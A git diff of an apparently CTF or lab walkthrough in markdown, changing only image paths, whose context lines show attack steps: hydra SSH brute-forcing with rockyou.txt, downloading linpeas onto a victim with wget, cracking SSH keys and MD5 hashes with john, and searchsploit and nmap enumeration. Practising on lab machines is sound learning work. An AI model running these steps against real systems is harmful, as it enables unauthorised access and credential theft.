@@ -316,7 +316,7 @@ hydra -l jan -P rockyou.txt 10.48.190.165 ssh
 
 We found password
 
-![enum result](Assets/2.png)
+![enum result](NPT/Assets/2.png)
 
 Let us do ssh login
 
@@ -348,7 +348,7 @@ Now we have linpeas inside /dev/shm in victim’s system
 
 We found a whole big RSA key let us copy this to a file
 
-![enum result](Assets/3.png)
+![enum result](NPT/Assets/3.png)
 
 Copy this file into a file with name rsa_key
 
@@ -362,7 +362,7 @@ First save this into a hash and then we will use ssh2john to crack it
 john --wordlist=rockyou.txt pass.hash
 ```
 
-![enum result](Assets/4.png)
+![enum result](NPT/Assets/4.png)
 
 ```
 ssh -i /home/kay/.ssh/id_rsa kay@1<IP>
@@ -376,7 +376,7 @@ We are into kay
 cat pass.bak
 ```
 
-![enum result](Assets/5.png)
+![enum result](NPT/Assets/5.png)
 
 
 ## 4. Mr. Robot
@@ -452,7 +452,7 @@ john md5.hash --wordlist=fsocity.dic --format=Raw-MD5
 
 password is: abcdefghijklmnopqrstuvwxyz
 
-![enum result](Assets/6.png)
+![enum result](NPT/Assets/6.png)
 
 
 Now we can directly use it but let’s have a fully operational shell first inside the victim’s machine
@@ -508,7 +508,7 @@ wget http://<ip>:3030/linpeas.sh
 
 ##### We can’t run linpeas
 
-![enum result](Assets/7.png)
+![enum result](NPT/Assets/7.png)
 
 For second find root user and for this we will run a command which will allow us to find any SUID binaries
 
@@ -566,7 +566,7 @@ searchsploit ProFTPD 1.3.5
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.48.185.198
 ```
 
-![enum result](Assets/8.png)
+![enum result](NPT/Assets/8.png)
 
 ```
 ncat 10.49.133.202 21
